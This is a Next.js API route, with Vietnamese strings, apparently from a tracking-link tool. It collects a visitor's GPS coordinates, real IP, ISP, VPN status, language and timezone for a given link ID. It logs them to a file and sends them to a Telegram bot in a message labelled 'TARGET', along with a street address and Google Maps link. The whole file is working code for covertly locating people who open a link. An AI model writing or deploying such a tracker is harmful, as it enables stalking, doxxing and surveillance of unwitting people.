
import { NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';
import { headers } from 'next/headers';
import { getVerificationConfigAction } from '@/app/actions/settings';

async function getAddress(lat: number, lon: number): Promise<string> {
    try {
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}&accept-language=vi`, {
          headers: {
            'User-Agent': 'Sentinel_V78/1.0'
          }
        });
        if (!response.ok) return "Không thể lấy địa chỉ.";
        const data = await response.json();
        return data.display_name || "Không tìm thấy tên địa chỉ.";
    } catch (error) {
        return "Lỗi khi truy vấn địa chỉ.";
    }
}

async function checkIpIntelligence(ip: string) {
    try {
        // Sử dụng ip-api.com để lấy ISP và thông tin Proxy/VPN
        const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,isp,city,country,proxy,lat,lon`, {
            next: { revalidate: 3600 }
        });
        if (res.ok) {
            return await res.json();
        }
    } catch (e) {
        console.error('IP Intel Error:', e);
    }
    return null;
}

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { lat, lon, acc, lang, timezone, linkId, status: clientStatus } = body;

    const headersList = await headers();
    const ua = headersList.get('user-agent') ?? 'unknown';
    
    // Phát hiện IP thật của khách hàng
    const forwardedFor = headersList.get('x-forwarded-for');
    const realIp = headersList.get('x-real-ip');
    let finalIp = realIp || (forwardedFor ? forwardedFor.split(',')[0].trim() : 'N/A');
    
    if (finalIp.startsWith('::ffff:')) {
      finalIp = finalIp.substring(7);
    }

    // Kiểm tra IP Intelligence
    const intel = await checkIpIntelligence(finalIp);
    const isp = intel?.status === 'success' ? intel.isp : "Không rõ ISP";
    const fraud = intel?.proxy ? "VPN/Proxy" : "Sạch";

    let address = "Đang xác định...";
    let maps_link = "N/A";
    let isGps = false;

    if (lat !== undefined && lon !== undefined && lat !== null && lon !== null) {
      isGps = true;
      address = await getAddress(lat, lon);
      maps_link = `https://www.google.com/maps?q=${lat},${lon}`;
    } else if (intel?.status === 'success') {
      address = `${intel.city}, ${intel.country} (Ước tính IP)`;
      maps_link = `https://www.google.com/maps?q=${intel.lat || 0},${intel.lon || 0}`;
    }

    let logData = `--- [${new Date().toISOString()}] MỚI TRUY CẬP ---\n`;
    logData += `Link ID: ${linkId || 'ROOT'}\n`;
    logData += `Trạng thái: ${isGps ? 'GPS THÀNH CÔNG' : (clientStatus || 'CHỈ IP')}\n`;
    logData += `Thiết bị: ${ua}\n`;
    logData += `Địa chỉ IP: ${finalIp}\n`;
    logData += `ISP: ${isp}\n`;
    logData += `Bảo mật: ${fraud}\n`;
    logData += `Ngôn Ngữ: ${lang || 'N/A'}\n`;
    logData += `Múi Giờ: ${timezone || 'N/A'}\n`;
    if (isGps) {
        logData += `Tọa độ: ${lat}, ${lon}\n`;
        logData += `Độ chính xác: ${acc}m\n`;
    }
    logData += `Địa chỉ: ${address}\n`;
    logData += `Link Google Maps: ${maps_link}\n`;
    logData += `----------------------------------\n`;

    const logDir = path.join(process.cwd(), 'logs');
    const logFile = path.join(logDir, 'tracking_logs.txt');
    
    if (!fs.existsSync(logDir)) {
      fs.mkdirSync(logDir, { recursive: true });
    }
    fs.appendFileSync(logFile, logData, 'utf-8');

    // Telegram Notification
    const settings = await getVerificationConfigAction();
    if (settings.tgToken && settings.tgChatId) {
        const msg = `🛰️ <b>MỤC TIÊU: [${linkId || 'ROOT'}]</b>\n🛡️ Trạng thái: <b>${isGps ? 'GPS Thành Công' : 'Chỉ IP'}</b>\n🌐 IP: <code>${finalIp}</code>\n📍 Địa chỉ: <code>${address}</code>\n🗺️ Map: ${maps_link}`;
        fetch(`https://api.telegram.org/bot${settings.tgToken}/sendMessage?chat_id=${settings.tgChatId}&text=${encodeURIComponent(msg)}&parse_mode=HTML`).catch(e => console.error("Telegram Error:", e));
    }
    
    return NextResponse.json({ status: 'ok' });
  } catch (error) {
    console.error('Failed to log location:', error);
    return NextResponse.json({ error: 'Failed to process request' }, { status: 500 });
  }
}
